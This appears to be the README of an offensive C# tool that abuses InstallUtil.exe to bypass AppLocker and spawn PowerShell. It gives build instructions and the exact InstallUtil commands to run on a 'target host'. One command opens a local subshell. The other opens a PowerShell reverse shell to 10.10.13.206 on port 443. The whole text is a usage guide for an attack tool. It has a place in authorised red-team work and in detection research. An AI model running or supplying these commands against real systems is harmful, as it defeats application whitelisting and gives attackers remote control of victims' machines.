#Build the binary

The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...
IDE - Visual Studio 2015. You should be able to easily compile and build the binary with the default configuration Debug/X64. You only may to fix the System.Management.Automation reference that is located in the GAC folder

```
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
```

#Usage

Well, nothing new here as we're going to use the old and well-known trick of "InstallUtil.exe" to bypass AppLocker. Once you've compiled the binary, issue the below command on the target host.
Besides, your binary doesn't have to be an "exe" as InstallUtil.exe parse any file type (.txt, .bin....)

This one opens a subshell in the current console:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe

```

This one tries to open a PS reverse shell (I've bound it into the source as a life saver :-)):
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
